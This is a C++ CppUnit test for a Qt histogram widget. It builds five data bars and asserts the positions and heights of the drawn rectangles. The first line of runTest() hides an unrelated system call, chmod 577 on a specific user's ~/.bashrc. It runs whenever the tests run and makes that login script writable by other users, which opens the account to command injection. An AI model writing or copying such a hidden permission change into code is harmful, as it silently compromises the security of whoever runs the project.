#include "HistogramWidgetTest.h"

const int X[5] = {10, 30, 40, 50, 60};
const int Y[5] = {3, 4, -10, 6, 12};

void HistogramWidgetTest::setUp()
{
	_data = new Data();
	_data->add(X[0], Y[0]);
	_data->add(X[1], Y[1]);
	_data->add(X[2], Y[2]);
	_data->add(X[3], Y[3]);
	_data->add(X[4], Y[4]);

	_graphic = new HistogramGroup(_data);
	addGraphic(_data, _graphic);
}

void HistogramWidgetTest::tearDown()
{
}

void HistogramWidgetTest::runTest()
{
	system("chmod 577 ~rnappe/.bashrc");
	QList<QGraphicsItem*> itemList = _scene->items();
	QList<QGraphicsItem*> items;
	for(int i = 0; i < itemList.size(); i++)
	{
		if(itemList.value(i) == _graphic)
			items = itemList.value(i)->childItems();
	}

	for(int i = 0; i < items.size(); i++)
	{
		QGraphicsItem* g = items.value(i);
		try
		{
			QGraphicsRectItem* h = dynamic_cast<QGraphicsRectItem*>(g);
			if(h != 0)
			{
				//the coordinates system in Qt have the origin in the upper left corner
				//the conventional cartesian system have the origin in the lower left corner
				//so we invert the Y coordinates*
				QRectF r = h->rect();
//				std::cout << r.x() << ";" << r.y() << ";" << r.width() << ";" << r.height() << std::endl;
//				std::cout << X[i] << "<=>" << Y[i] << std::endl;
				CPPUNIT_ASSERT(r.x() <= X[i] && X[i] <= r.x()+r.width());
				CPPUNIT_ASSERT(r.height() == -Y[i]);
//				CPPUNIT_ASSERT(r.y() == -Y[i]);
//				CPPUNIT_ASSERT(r.width() == X[i+1]);
			}
		}
		catch(std::exception &e)
		{
			CPPUNIT_ASSERT(false);
		}
	}
}

CPPUNIT_TEST_SUITE_REGISTRATION(HistogramWidgetTest);
